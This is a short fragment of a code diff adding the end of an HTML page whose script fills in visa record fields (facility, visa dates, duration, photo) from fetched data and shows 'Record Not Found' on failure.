+        setText("staying_facility", data.staying_facility);
+        setText("visa_start", formatDate(data.visa_start_date));
+        setText("visa_end", formatDate(data.visa_end_date));
+        setText("visa_duration", data.visa_duration);
+        if (data.photo) { document.getElementById("photo").src = data.photo; }
+        showPage();
+      })
+      .catch(function() {
+        document.getElementById("login-block").innerHTML = "<h2 style='text-align:center;margin-top:40px;'>Record Not Found</h2>";
+        showPage();
+      });
+  } else {
+    showPage();
+  }
+</script>
+</body>
+</html>
